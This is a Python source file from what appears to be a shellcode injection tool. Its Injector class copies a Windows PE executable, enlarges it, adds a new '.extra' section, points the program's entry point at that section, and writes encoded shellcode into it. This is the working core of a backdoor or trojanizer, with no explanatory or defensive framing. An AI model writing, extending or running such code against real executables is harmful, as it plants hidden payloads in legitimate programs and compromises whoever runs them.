import sys
from inject.shellcode import Shellcode
from inject.output import Output
from inject.pe_manager import PEManager

from typing import List
from pathlib import Path
from shutil import copy
from utils import shellcode_encoder
import mmap
from struct import pack
from pefile import PE

HEADER_SIZE = 40
EXTRA_SIZE_TO_RESTORE = 8


class Injector:
    def __init__(self, shellcode: bytes, file: Path, output: Path, options: dict):

        # Set Basics
        self.shellcode: Shellcode = Shellcode(shellcode, options)
        self.output: Output = Output(output, file)

        # Loaded /Computed Later
        self.original: PEManager = None
        self.target: PEManager = None

    def inject(self):
        # delete old output if it exists
        self.output.clean()

        # copy source file to output file
        self.output.create_from_source()

        # parse freshly copied output
        self.original = PEManager(self.output)
        self.original.dump_basic_info()

        print("-- Expanding File --")
        # actually expand the file
        self.output.expand_for_sc(
            self.shellcode.get_final_size(), self.original.file_alignment()
        )

        self.target = self.original.create_new_section(self.shellcode, ".extra")

        print("-- Changing Entry Point --")

        self.target = self.target.change_entry_point()
        print("-- Injecting Shellcode --")

        self.target.write_shellcode(self.shellcode)
        print("-- Injection Complete --")

